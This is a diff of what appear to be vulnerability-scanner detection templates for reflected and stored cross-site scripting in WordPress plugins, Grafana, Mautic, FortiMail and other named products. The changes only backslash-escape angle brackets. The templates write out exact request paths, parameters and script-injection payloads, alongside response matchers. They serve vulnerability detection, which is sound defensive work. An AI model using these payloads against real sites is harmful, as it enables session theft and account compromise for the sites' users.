 - A cross-site scripting vulnerability in preview-shortcode-external.php in the Shortcode Ninja plugin 1.4 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the shortcode parameter.
 - severity - medium
@@ -7568,7 +7568,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. '><script>alert(document.domain)</script>
+    1. '>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -7581,7 +7581,7 @@ Content-Type: application/x-www-form-urlencoded
     1. 200
 
 ---
-# Infusionsoft Gravity Forms Add-on < 1.5.7 - Cross-Site Scripting
+# Infusionsoft Gravity Forms Add-on \< 1.5.7 - Cross-Site Scripting
 ## Description
 - Multiple cross-site scripting vulnerabilities in tests/notAuto_test_ContactService_pauseCampaign.php in the Infusionsoft Gravity Forms plugin before 1.5.6 for WordPress allow remote attackers to inject arbitrary web script or HTML via the (1) go, (2) contactId, or (3) campaignId parameter.
 - severity - medium
@@ -7594,7 +7594,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. "></script><script>alert(document.domain)</script>
+    1. ">\</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -7607,7 +7607,7 @@ Content-Type: application/x-www-form-urlencoded
     1. 200
 
 ---
-# Frontend Uploader <= 0.9.2 - Cross-Site Scripting
+# Frontend Uploader \<= 0.9.2 - Cross-Site Scripting
 ## Description
 - The Frontend Uploader WordPress plugin prior to v.0.9.2 was affected by an unauthenticated Cross-Site Scripting security vulnerability.
 - severity - medium
@@ -7620,7 +7620,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -7641,13 +7641,13 @@ Content-Type: application/x-www-form-urlencoded
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/webadmin/deny/index.php?dpid=1&dpruleid=1&cat=1&ttl=5018400&groupname=<group_name_eg_netsweeper_student_allow_internet_access&policyname=auto_created&username=root&userip=127.0.0.1&connectionip=127.0.0.1&nsphostname=netsweeper&url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+- {{BaseURL}}/webadmin/deny/index.php?dpid=1&dpruleid=1&cat=1&ttl=5018400&groupname=\<group_name_eg_netsweeper_student_allow_internet_access&policyname=auto_created&username=root&userip=127.0.0.1&connectionip=127.0.0.1&nsphostname=netsweeper&url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -7673,7 +7673,7 @@ Content-Type: application/x-www-form-urlencoded
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -7698,7 +7698,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -7724,7 +7724,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. <script>alert(1)</script>
+    1. \<script>alert(1)\</script>
 
 **Type - word**
 - part - header
@@ -7736,7 +7736,7 @@ Content-Type: application/x-www-form-urlencoded
     1. 200
 
 ---
-# Movies <= 0.6 - Cross-Site Scripting
+# Movies \<= 0.6 - Cross-Site Scripting
 ## Description
 - A cross-site scripting vulnerability in the Movies plugin 0.6 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the filename parameter to getid3/demos/demo.mimeonly.php.
 - severity - medium
@@ -7749,7 +7749,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. '><script>alert(document.cookie)</script>
+    1. '>\<script>alert(document.cookie)\</script>
 - part - body
 
 **Type - word**
@@ -7762,7 +7762,7 @@ Content-Type: application/x-www-form-urlencoded
     1. 200
 
 ---
-# WooCommerce Swipe <= 2.7.1 - Cross-Site Scripting
+# WooCommerce Swipe \<= 2.7.1 - Cross-Site Scripting
 ## Description
 - A cross-site scripting vulnerability in test-plugin.php in the Swipe Checkout for WooCommerce plugin 2.7.1 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the api_url parameter.
 - severity - medium
@@ -7775,7 +7775,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. '><script>alert(document.domain)</script>
+    1. '>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -7801,7 +7801,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. </textarea></script><script>alert(document.domain)</script>
+    1. \</textarea>\</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -7814,7 +7814,7 @@ Content-Type: application/x-www-form-urlencoded
     1. 200
 
 ---
-# WP Planet <= 0.1 - Cross-Site Scripting
+# WP Planet \<= 0.1 - Cross-Site Scripting
 ## Description
 - A cross-site scripting vulnerability in rss.class/scripts/magpie_debug.php in the WP-Planet plugin 0.1 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the url parameter.
 - severity - medium
@@ -7827,7 +7827,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -7840,7 +7840,7 @@ Content-Type: application/x-www-form-urlencoded
     1. 200
 
 ---
-# WordPress Sniplets <=1.2.2 - Cross-Site Scripting
+# WordPress Sniplets \<=1.2.2 - Cross-Site Scripting
 ## Description
 - WordPress Sniplets 1.1.2 and 1.2.2 plugin contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary web script or HTML via the text parameter to warning.php, notice.php, and inset.php in view/sniplets/, and possibly modules/execute.php; via the url parameter to view/admin/submenu.php; and via the page parameter to view/admin/pager.php.
 
@@ -7855,7 +7855,7 @@ Content-Type: application/x-www-form-urlencoded
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -7867,7 +7867,7 @@ Content-Type: application/x-www-form-urlencoded
     1. 200
 
 ---
-# AppServ Open Project <=2.5.10 - Cross-Site Scripting
+# AppServ Open Project \<=2.5.10 - Cross-Site Scripting
 ## Description
 - AppServ Open Project 2.5.10 and earlier contains a cross-site scripting vulnerability in index.php which allows remote attackers to inject arbitrary web script or HTML via the appservlang parameter.
 - severity - medium
@@ -7884,7 +7884,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. <svg/onload=confirm('xss')>
+    1. \<svg/onload=confirm('xss')>
 - part - body
 
 **Type - word**
@@ -7937,7 +7937,7 @@ Content-Type: application/x-www-form-urlencoded
 **Type - word**
 - part - body
 - words
-    1. sub menu for: <script>alert(document.domain)</script>
+    1. sub menu for: \<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -7949,7 +7949,7 @@ Content-Type: application/x-www-form-urlencoded
     1. 500
 
 ---
-# WooCommerce PDF Invoices & Packing Slips WordPress Plugin < 2.10.5 - Cross-Site Scripting
+# WooCommerce PDF Invoices & Packing Slips WordPress Plugin \< 2.10.5 - Cross-Site Scripting
 ## Description
 - The Wordpress plugin WooCommerce PDF Invoices & Packing Slips before 2.10.5 does not escape the tab and section parameters before reflecting it an attribute, leading to a reflected cross-site scripting in the admin dashboard.
 - severity - medium
@@ -7986,7 +7986,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Goto Tour & Travel Theme <2.0 - Cross-Site Scripting
+# WordPress Goto Tour & Travel Theme \<2.0 - Cross-Site Scripting
 ## Description
 - WordPress Goto Tour & Travel theme before 2.0 contains an unauthenticated reflected cross-site scripting vulnerability. It does not sanitize the keywords and start_date GET parameters on its Tour List page.
 - severity - medium
@@ -8050,13 +8050,13 @@ Host: {{Hostname}}
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/wp-login.php?login-error=<script>alert(document.domain)</script>
+- {{BaseURL}}/wp-login.php?login-error=\<script>alert(document.domain)\</script>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. ERROR (<script>alert(document.domain)</script>):
+    1. ERROR (\<script>alert(document.domain)\</script>):
     2. Login with OpenID Connect
 - condition - and
 
@@ -8070,7 +8070,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Ocean Extra <1.9.5 - Cross-Site Scripting
+# WordPress Ocean Extra \<1.9.5 - Cross-Site Scripting
 ## Description
 - WordPress Ocean Extra plugin before 1.9.5 contains a cross-site scripting vulnerability. The plugin does not escape generated links which are then used when the OceanWP theme is active.
 - severity - medium
@@ -8089,7 +8089,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/?step=demo&page=owp_setup&a"><script>alert(/XSS/)</script>   HTTP/1.1
+GET /wp-admin/?step=demo&page=owp_setup&a">\<script>alert(/XSS/)\</script>   HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -8099,7 +8099,7 @@ Host: {{Hostname}}
 - part - body
 - words
     1. OceanWP
-    2. ><script>alert(/XSS/)</script>
+    2. >\<script>alert(/XSS/)\</script>
 - condition - and
 
 **Type - word**
@@ -8148,7 +8148,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. ><img src=a onerror=alert("document.domain")>
+    1. >\<img src=a onerror=alert("document.domain")>
     2. i-Panel Administration
 - condition - and
 
@@ -8177,7 +8177,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -8189,7 +8189,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Grafana 8.0.0 <= v.8.2.2 - Angularjs Rendering Cross-Site Scripting
+# Grafana 8.0.0 \<= v.8.2.2 - Angularjs Rendering Cross-Site Scripting
 ## Description
 - Grafana is an open-source platform for monitoring and observability. In affected versions if an attacker is able to convince a victim to visit a URL referencing a vulnerable page, arbitrary JavaScript content may be executed within the context of the victim's browser. The user visiting the malicious link must be unauthenticated and the link must be for a page that contains the login button in the menu bar. The url has to be crafted to exploit AngularJS rendering and contain the interpolation binding for AngularJS expressions.
 - severity - medium
@@ -8274,7 +8274,7 @@ Connection: close
     1. sh"/onmouseover="alert(1)">
 
 ---
-# WordPress Jannah Theme <5.4.4 - Cross-Site Scripting
+# WordPress Jannah Theme \<5.4.4 - Cross-Site Scripting
 ## Description
 - WordPress Jannah theme before 5.4.4 contains a reflected cross-site scripting vulnerability. It does not properly sanitize the options JSON parameter in its tie_get_user_weather AJAX action before outputting it back in the page.
 - severity - medium
@@ -8287,7 +8287,7 @@ Connection: close
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -8347,10 +8347,10 @@ Connection: close
 **Type - word**
 - part - body
 - words
-    1. "><script>alert({{randstr}})</script>
+    1. ">\<script>alert({{randstr}})\</script>
 
 ---
-# WordPress Post Grid <2.1.8 - Cross-Site Scripting
+# WordPress Post Grid \<2.1.8 - Cross-Site Scripting
 ## Description
 - WordPress Post Grid plugin before 2.1.8 contains a reflected cross-site scripting vulnerability. The slider import search feature and tab parameter of thesettings are not properly sanitized before being output back in the pages,
 - severity - medium
@@ -8400,7 +8400,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - words
@@ -8438,7 +8438,7 @@ browserCheckEnabled=true&username=admin&language=en_US&defaultHttpPort=80&screen
 **Type - word**
 - part - body
 - words
-    1. "><h1>Test</h1>26" class="loginUserNameText
+    1. ">\<h1>Test\</h1>26" class="loginUserNameText
 
 **Type - word**
 - part - header
@@ -8459,7 +8459,7 @@ browserCheckEnabled=true&username=admin&language=en_US&defaultHttpPort=80&screen
     1. csrfp_login=([a-zA-Z0-9]+);
 
 ---
-# WordPress Elementor Website Builder <3.1.4 - Cross-Site Scripting
+# WordPress Elementor Website Builder \<3.1.4 - Cross-Site Scripting
 ## Description
 - WordPress Elementor Website Builder plugin before 3.1.4 contains a DOM cross-site scripting vulnerability. It does not sanitize or escape user input appended to the DOM via a malicious hash.
 
@@ -8479,7 +8479,7 @@ browserCheckEnabled=true&username=admin&language=en_US&defaultHttpPort=80&screen
 
 **Type - dsl**
 - dsl
-    1. compare_versions(version, '> 1.5.0', '< 3.1.4') && status_code_1 == 200 && status_code_2 == 200
+    1. compare_versions(version, '> 1.5.0', '\< 3.1.4') && status_code_1 == 200 && status_code_2 == 200
 ### Extractors
 
 **Type - regex**
@@ -8494,7 +8494,7 @@ browserCheckEnabled=true&username=admin&language=en_US&defaultHttpPort=80&screen
     1. version
 
 ---
-# WordPress Duplicate Page or Post <1.5.1 - Cross-Site Scripting
+# WordPress Duplicate Page or Post \<1.5.1 - Cross-Site Scripting
 ## Description
 - WordPress Duplicate Page or Post plugin before 1.5.1 contains a stored cross-site scripting vulnerability. The plugin does not have any authorization and has a flawed cross-site request forgery check in the wpdevart_duplicate_post_parametrs_save_in_db AJAX action, allowing unauthenticated users to call it and change the plugin's settings, or perform such attack via cross-site request forgery.
 
@@ -8564,7 +8564,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. ><script>alert(document.domain)</script>
+    1. >\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -8592,7 +8592,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - condition - and
 
 **Type - word**
@@ -8601,7 +8601,7 @@ Host: {{Hostname}}
     1. text/html
 
 ---
-# Ghost CMS <=4.32 - Cross-Site Scripting
+# Ghost CMS \<=4.32 - Cross-Site Scripting
 ## Description
 - Ghost CMS 4.0.0 to 4.3.2 contains a DOM cross-site scripting vulnerability. An unused endpoint added during the development of 4.0.0 allows attackers to gain access by getting logged-in users to click a link containing malicious code.
 - severity - medium
@@ -8680,7 +8680,7 @@ Host: {{Hostname}}
 
 **Type - dsl**
 - dsl
-    1. contains(body_4, '<p><script>alert(document.cookie)</script></p>')
+    1. contains(body_4, '\<p>\<script>alert(document.cookie)\</script>\</p>')
     2. contains(body_4, 'FlatPress')
     3. contains(all_headers_4, 'text/html')
     4. status_code_4 == 200
@@ -8696,7 +8696,7 @@ Host: {{Hostname}}
     1. name="_wpnonce" value="([0-9a-z]+)" />
 
 ---
-# WordPress iQ Block Country <=1.2.11 - Cross-Site Scripting
+# WordPress iQ Block Country \<=1.2.11 - Cross-Site Scripting
 ## Description
 - WordPress iQ Block Country plugin 1.2.11 and prior contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 
@@ -8724,7 +8724,7 @@ POST /wp-admin/options.php HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded
 
-option_page=iqblockcountry-settings-group&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Diq-block-country%2Flibs%2Fblockcountry-settings.php&blockcountry_blockmessage=test</textarea><script>alert(document.domain)</script>&blockcountry_redirect=2&blockcountry_redirect_url=&blockcountry_header=on&blockcountry_nrstatistics=15&blockcountry_daysstatistics=30&blockcountry_geoapikey=&blockcountry_apikey=&blockcountry_ipoverride=NONE&blockcountry_debuglogging=on
+option_page=iqblockcountry-settings-group&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Diq-block-country%2Flibs%2Fblockcountry-settings.php&blockcountry_blockmessage=test\</textarea>\<script>alert(document.domain)\</script>&blockcountry_redirect=2&blockcountry_redirect_url=&blockcountry_header=on&blockcountry_nrstatistics=15&blockcountry_daysstatistics=30&blockcountry_geoapikey=&blockcountry_apikey=&blockcountry_ipoverride=NONE&blockcountry_debuglogging=on
 
 ```
 ### Step - 4
@@ -8739,8 +8739,8 @@ Host: {{Hostname}}
 - dsl
     1. contains(all_headers_4, "text/html")
     2. status_code_4 == 200
-    3. contains(body_4, 'blockcountry_blockmessage\">test</textarea><script>alert(document.domain)</script>')
-    4. contains(body_4, '<h3>Block type</h3>')
+    3. contains(body_4, 'blockcountry_blockmessage\">test\</textarea>\<script>alert(document.domain)\</script>')
+    4. contains(body_4, '\<h3>Block type\</h3>')
 - condition - and
 ### Extractors
 
@@ -8789,11 +8789,11 @@ Host: {{Hostname}}
 - dsl
     1. contains(all_headers_3, 'text/html')
     2. status_code_3 == 200
-    3. contains(body_3, "<script>alert(document.domain)</script> Test</td>")
+    3. contains(body_3, "\<script>alert(document.domain)\</script> Test\</td>")
 - condition - and
 
 ---
-# WordPress Pro Real Estate 7 Theme <3.1.1 - Cross-Site Scripting
+# WordPress Pro Real Estate 7 Theme \<3.1.1 - Cross-Site Scripting
 ## Description
 - WordPress Pro Real Estate 7 theme before 3.1.1 contains a reflected cross-site scripting vulnerability. It does not properly sanitize the ct_community parameter in its search listing page before outputting it back.
 
@@ -8813,7 +8813,7 @@ Connection: close
 
 **Type - word**
 - words
-    1. <script>alert(document.domain);</script>
+    1. \<script>alert(document.domain);\</script>
     2. /wp-content/themes/realestate
 - part - body
 - condition - and
@@ -8840,7 +8840,7 @@ Connection: close
 
 **Type - word**
 - words
-    1. ><script>alert(document.domain)</script>
+    1. >\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -8849,7 +8849,7 @@ Connection: close
 - part - header
 
 ---
-# Triconsole Datepicker Calendar <3.77 - Cross-Site Scripting
+# Triconsole Datepicker Calendar \<3.77 - Cross-Site Scripting
 ## Description
 - Triconsole Datepicker Calendar before 3.77 contains a cross-site scripting vulnerability in calendar_form.php. Attackers can read authentication cookies that are still active, which can be used to perform further attacks such as reading browser history, directory listings, and file contents.
 
@@ -8858,14 +8858,14 @@ Connection: close
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/calendar/calendar_form.php/"><script>alert(document.domain)</script>
+- {{BaseURL}}/calendar/calendar_form.php/">\<script>alert(document.domain)\</script>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
-    2. <title>TriConsole.com - PHP Calendar Date Picker</title>
+    1. \<script>alert(document.domain)\</script>
+    2. \<title>TriConsole.com - PHP Calendar Date Picker\</title>
 - condition - and
 
 **Type - word**
@@ -8897,7 +8897,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=fv_player_stats&player_id=1</script><script>alert(document.domain)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=fv_player_stats&player_id=1\</script>\<script>alert(document.domain)\</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -8906,8 +8906,8 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
-    2. <h1>FV Player Stats</h1>
+    1. \</script>\<script>alert(document.domain)\</script>
+    2. \<h1>FV Player Stats\</h1>
 - condition - and
 
 **Type - word**
@@ -8953,7 +8953,7 @@ Content-Disposition: form-data; name="brandname"
 ------WebKitFormBoundarypWqYipqU21aYgccv
 Content-Disposition: form-data; name="vehicalorcview"
 
-</script><script>alert(document.domain)</script>
+\</script>\<script>alert(document.domain)\</script>
 ------WebKitFormBoundarypWqYipqU21aYgccv
 Content-Disposition: form-data; name="priceperday"
 
@@ -9013,7 +9013,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -9025,7 +9025,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Mautic <3.3.4 - Cross-Site Scripting
+# Mautic \<3.3.4 - Cross-Site Scripting
 ## Description
 - Mautic before 3.3.4 contains a cross-site scripting vulnerability on the password reset page in the bundle parameter of the URL. An attacker can inject arbitrary script, steal cookie-based authentication credentials, and/or launch other attacks.
 - severity - medium
@@ -9053,7 +9053,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Accela Civic Platform <=21.1 - Cross-Site Scripting
+# Accela Civic Platform \<=21.1 - Cross-Site Scripting
 ## Description
 - Accela Civic Platform through 21.1 contains a cross-site scripting vulnerability via the security/hostSignon.do parameter servProvCode.
 - severity - medium
@@ -9095,8 +9095,8 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. value=""><script>alert(document.domain)</script>"><input type=
-    2. value: "><script>alert(document.domain)</script>)<br>
+    1. value="">\<script>alert(document.domain)\</script>">\<input type=
+    2. value: ">\<script>alert(document.domain)\</script>)\<br>
 - condition - or
 
 **Type - word**
@@ -9109,7 +9109,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Jannah Theme <5.4.5 - Cross-Site Scripting
+# WordPress Jannah Theme \<5.4.5 - Cross-Site Scripting
 ## Description
 - WordPress Jannah theme before 5.4.5 contains a reflected cross-site scripting vulnerability. It does not properly sanitize the 'query' POST parameter in its tie_ajax_search AJAX action.
 - severity - medium
@@ -9122,14 +9122,14 @@ Host: {{Hostname}}
 Accept: */*
 Content-Type: application/x-www-form-urlencoded
 
-action=tie_ajax_search&query[]=</script><script>alert(document.domain)</script>
+action=tie_ajax_search&query[]=\</script>\<script>alert(document.domain)\</script>
 
 ```
 ### Matchers
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -9142,7 +9142,7 @@ action=tie_ajax_search&query[]=</script><script>alert(document.domain)</script>
     1. 200
 
 ---
-# WordPress Transposh Translation <1.0.8 - Cross-Site Scripting
+# WordPress Transposh Translation \<1.0.8 - Cross-Site Scripting
 ## Description
 - WordPress Transposh Translation plugin before 1.0.8 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the a parameter via an AJAX action (available to both unauthenticated and authenticated users when the curl library is installed) before outputting it back in the response.
 - severity - medium
@@ -9150,13 +9150,13 @@ action=tie_ajax_search&query[]=</script><script>alert(document.domain)</script>
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/wp-admin/admin-ajax.php?action=tp_tp&e=g&m=s&tl=en&q=<img%20src%3dx%20onerror%3dalert(document.domain)>
+- {{BaseURL}}/wp-admin/admin-ajax.php?action=tp_tp&e=g&m=s&tl=en&q=\<img%20src%3dx%20onerror%3dalert(document.domain)>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. <img src=x onerror=alert(document.domain)>
+    1. \<img src=x onerror=alert(document.domain)>
     2. {"result":
 - condition - and
 
@@ -9197,7 +9197,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </i><script>alert(document.domain)</script></div>
+    1. \</i>\<script>alert(document.domain)\</script>\</div>
 
 **Type - word**
 - part - header
@@ -9217,13 +9217,13 @@ Host: {{Hostname}}
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/fmlurlsvc/?=&url=https%3A%2F%2Fgoogle.com<Svg%2Fonload%3Dalert(document.domain)>
+- {{BaseURL}}/fmlurlsvc/?=&url=https%3A%2F%2Fgoogle.com\<Svg%2Fonload%3Dalert(document.domain)>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. <Svg/onload=alert(document.domain)>
+    1. \<Svg/onload=alert(document.domain)>
     2. FortiMail Click Protection
 - condition - and
 
@@ -9237,7 +9237,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Contact Form 7 Skins <=2.5.0 - Cross-Site Scripting
+# WordPress Contact Form 7 Skins \<=2.5.0 - Cross-Site Scripting
 ## Description
 - WordPress Contact Form 7 Skins plugin 2.5.0 and prior contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the tab parameter before outputting it back in an admin page.
 - severity - medium
@@ -9265,7 +9265,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <img src onerror=alert(document.domain)>' type='hidden
+    1. \<img src onerror=alert(document.domain)>' type='hidden
 
 **Type - word**
 - part - header
@@ -9277,7 +9277,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# QSAN Storage Manager <3.3.3 - Cross-Site Scripting
+# QSAN Storage Manager \<3.3.3 - Cross-Site Scripting
 ## Description
 - QSAN Storage Manager before 3.3.3 contains a reflected cross-site scripting vulnerability.  Header page parameters do not filter special characters. Remote attackers can inject JavaScript to access and modify specific data.
 
@@ -9292,7 +9292,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. "HTTP_X_TRIGGER_XSS":"<script>alert(1)</script>"
+    1. "HTTP_X_TRIGGER_XSS":"\<script>alert(1)\</script>"
 
 **Type - word**
 - part - header
@@ -9304,7 +9304,7 @@ Host: {{Hostname}}
     1. !contains(tolower(all_headers), 'x-xss-protection')
 
 ---
-# WordPress WooCommerce <1.13.22 - Cross-Site Scripting
+# WordPress WooCommerce \<1.13.22 - Cross-Site Scripting
 ## Description
 - WordPress WooCommerce before 1.13.22 contains a reflected cross-site scripting vulnerability via the slider import search feature because it does not properly sanitize the keyword GET parameter.
 - severity - medium
@@ -9346,7 +9346,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Persian Woocommerce <=5.8.0 - Cross-Site Scripting
+# WordPress Persian Woocommerce \<=5.8.0 - Cross-Site Scripting
 ## Description
 - WordPress Persian Woocommerce plugin through 5.8.0 contains a cross-site scripting vulnerability. The plugin does not escape the s parameter before outputting it back in an attribute in the admin dashboard. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site and possibly steal cookie-based authentication credentials and launch other attacks.
 
@@ -9379,9 +9379,9 @@ Host: {{Hostname}}
 - condition - and
 
 ---
-# Easy Social Feed < 6.2.7 - Cross-Site Scripting
+# Easy Social Feed \< 6.2.7 - Cross-Site Scripting
 ## Description
-- Easy Social Feed < 6.2.7 is susceptible to reflected cross-site scripting because the plugin does not sanitize and escape a parameter before outputting it back in an admin dashboard page, leading to it being executed in the context of a logged admin or editor.
+- Easy Social Feed \< 6.2.7 is susceptible to reflected cross-site scripting because the plugin does not sanitize and escape a parameter before outputting it back in an admin dashboard page, leading to it being executed in the context of a logged admin or editor.
 - severity - medium
 - tags - cve,cve2021,wordpress,wp-plugin,xss,authenticated,wpscan
 ## Requests
@@ -9398,7 +9398,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=easy-facebook-likebox&access_token=a&type=</script><script>alert(document.domain)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=easy-facebook-likebox&access_token=a&type=\</script>\<script>alert(document.domain)\</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -9407,7 +9407,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. 'type' : '</script><script>alert(document.domain)</script>'
+    1. 'type' : '\</script>\<script>alert(document.domain)\</script>'
 
 **Type - word**
 - part - header
@@ -9456,11 +9456,11 @@ Host: {{Hostname}}
 - dsl
     1. contains(all_headers_3, 'text/html')
     2. status_code_3 == 200
-    3. contains(body_3, "<td>\"><script>alert(document.domain)</script></td>")
+    3. contains(body_3, "\<td>\">\<script>alert(document.domain)\</script>\</td>")
 - condition - and
 
 ---
-# SIS Informatik REWE GO SP17 <7.7 - Cross-Site Scripting
+# SIS Informatik REWE GO SP17 \<7.7 - Cross-Site Scripting
 ## Description
 - SIS Informatik REWE GO SP17 before 7.7 contains a cross-site scripting vulnerability via rewe/prod/web/index.php (affected parameters are config, version, win, db, pwd, and user) and /rewe/prod/web/rewe_go_check.php (version and all other parameters).
 - severity - medium
@@ -9474,7 +9474,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <script>confirm({{randstr}})</script>
+    1. \<script>confirm({{randstr}})\</script>
     2. SIS-REWE
 - condition - and
 
@@ -9484,7 +9484,7 @@ Host: {{Hostname}}
     1. text/html
 
 ---
-# WebCTRL OEM <= 6.5 - Cross-Site Scripting
+# WebCTRL OEM \<= 6.5 - Cross-Site Scripting
 ## Description
 - WebCTRL OEM 6.5 and prior is susceptible to a cross-site scripting vulnerability because the login portal does not sanitize the operatorlocale GET parameter.
 - severity - medium
@@ -9503,7 +9503,7 @@ Host: {{Hostname}}
 - part - body
 - condition - and
 - words
-    1. "><script>alert(document.domain)</script>
+    1. ">\<script>alert(document.domain)\</script>
     2. common/lvl5
 
 **Type - word**
@@ -9527,7 +9527,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <title>SSH Session </title><script>alert(document.domain)</script><title></title>
+    1. \<title>SSH Session \</title>\<script>alert(document.domain)\</script>\<title>\</title>
 
 **Type - word**
 - part - header
@@ -9539,7 +9539,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# SAP Knowledge Warehouse <=7.5.0 - Cross-Site Scripting
+# SAP Knowledge Warehouse \<=7.5.0 - Cross-Site Scripting
 ## Description
 - SAP Knowledge Warehouse 7.30, 7.31, 7.40, and 7.50 contain a reflected cross-site scripting vulnerability via the usage of one SAP KW component within a web browser.
 
